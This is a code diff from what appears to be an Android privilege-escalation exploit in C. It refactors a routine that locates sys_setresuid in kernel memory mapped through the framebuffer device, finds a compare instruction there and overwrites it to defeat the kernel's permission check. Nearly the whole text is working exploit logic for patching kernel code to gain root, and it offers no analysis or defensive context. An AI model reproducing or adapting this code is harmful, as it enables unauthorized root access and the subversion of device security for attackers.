@@ -165,22 +165,35 @@ attempt_diag_exploit(unsigned long int sys_setresuid_address)
 }
 
 static uint32_t cmp_operation_code = 0xe3500000;
-static bool
-fb_mem_exploit_callback(void *mmap_base_address, void *user_data)
+static void*
+find_cmp_operation_address_in_sys_setresuid(void *mmap_base_address)
 {
-  int ret;
+  int *cmp_operation;
   void *mapped_sys_setresuid_address;
   unsigned long int sys_setresuid_address = 0;
-  int *cmp_operation;
 
   sys_setresuid_address = get_sys_setresuid_address_in_memory(mmap_base_address);
   if (!sys_setresuid_address) {
     printf("Failed to get sys_setresuid address due to %s\n", strerror(errno));
-    return false;
+    return NULL;
   }
 
   mapped_sys_setresuid_address = fb_mem_convert_to_mmaped_address((void*)sys_setresuid_address, mmap_base_address);
   cmp_operation = memmem(mapped_sys_setresuid_address, 0x100, &cmp_operation_code, sizeof(cmp_operation_code));
+
+  return cmp_operation;
+}
+
+static bool
+fb_mem_exploit_callback(void *mmap_base_address, void *user_data)
+{
+  int ret;
+  int *cmp_operation;
+
+  cmp_operation = find_cmp_operation_address_in_sys_setresuid(mmap_base_address);
+  if (!cmp_operation) {
+    return false;
+  }
 
   if (*cmp_operation == cmp_operation_code) {
     *cmp_operation = cmp_operation_code + 1;
